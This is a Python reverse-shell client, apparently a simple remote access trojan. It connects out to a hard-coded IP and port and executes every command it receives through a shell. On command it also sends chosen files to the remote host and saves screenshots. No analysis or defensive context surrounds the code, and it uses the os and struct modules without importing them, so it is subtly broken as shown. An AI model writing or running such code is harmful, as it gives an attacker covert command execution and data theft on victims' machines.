import socket
import subprocess
import pyautogui

host = '192.168.153.1'
port = 5656

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(b'Success!')

while 1:
    data = s.recv(1024).decode()
    print(data)
    if data == "quit": break
    if data[:4]=='file':#command  file /mm/nn/bb.xxx
        filepath = data[6:]
        # 判断是否为文件
        if os.path.isfile(filepath):
            fileinfo_size = struct.calcsize('128sl')
            fhead = struct.pack('128sl', os.path.basename(filepath).encode('utf-8'), os.stat(filepath).st_size)
            s.send(fhead)
            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    print ('{0} file send over...'.format(os.path.basename(filepath)))
                    break
                s.send(data)
            continue
    if data == 'screen':
        img = pyautogui.screenshot()
        img.save('1.jpg')
        s.send('succcess save as 1.jpg'.encode())
        continue
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)
s.close()